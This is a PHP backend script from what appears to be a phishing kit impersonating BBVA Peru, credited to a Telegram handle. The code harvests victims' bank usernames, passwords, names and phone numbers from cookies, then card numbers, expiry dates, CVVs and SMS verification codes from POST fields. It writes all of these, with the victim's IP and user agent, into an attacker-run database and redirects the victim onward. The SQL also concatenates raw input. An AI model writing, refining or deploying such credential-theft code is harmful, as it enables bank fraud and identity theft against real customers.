<?php
/**
###############################################
#$      https://telegram.me/neo_net          $#
#$          The Wine Juggler of FUD          $#
###############################################
**/

include '../../panel/php/database/db.php';

if($_POST['content'] == 'main'){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message = "<pre>BBVA Peru Data\n";
$message .= "Usuario          : ".$_COOKIE['user']."\n";
$message .= "Password        : ".$_COOKIE['pass']."\n";
$message .= "Nombre        : ".$_COOKIE['nombre']."\n";
$message .= "Teléfono        : ".$_COOKIE['phone']."\n";
$message .= "|-------- I N F O --------|\n";
$message .= "IP: ".$ip."\n";
$message .= "User-Agent : ".$useragent."\n";
$message .= "</pre>";
$praga=rand();
$praga=md5($praga);


$connection->query("INSERT INTO numeros(ip,user_agent,user,pass,movil,nombre,token) VALUES ('".$ip."','".$useragent."','".$_COOKIE['user']."','".$_COOKIE['pass']."','".$_COOKIE['phone']."','".$_COOKIE['nombre']."','".$_COOKIE['cfdi']."')");
}


if($_POST['content'] == 'cc'){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$expiry = $_POST['expiry1'].'/'.$_POST['expiry2'];
$connection->query("UPDATE numeros SET cc='".$_POST['cc']."',expiry='".$expiry."',cvv='".$_POST['cvv']."',stella=1,status=NULL WHERE token='".@$_COOKIE['cfdi']."'");

header('Location: ../../static_w.php?load=3');
}

if($_POST['content'] == 'sms'){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$expiry = $_POST['expiry1'].'/'.$_POST['expiry2'];
$connection->query("UPDATE numeros SET firma='".$_POST['sms']."',status=NULL WHERE token='".@$_COOKIE['cfdi']."'");

header('Location: ../../static_w.php?load=3');
}
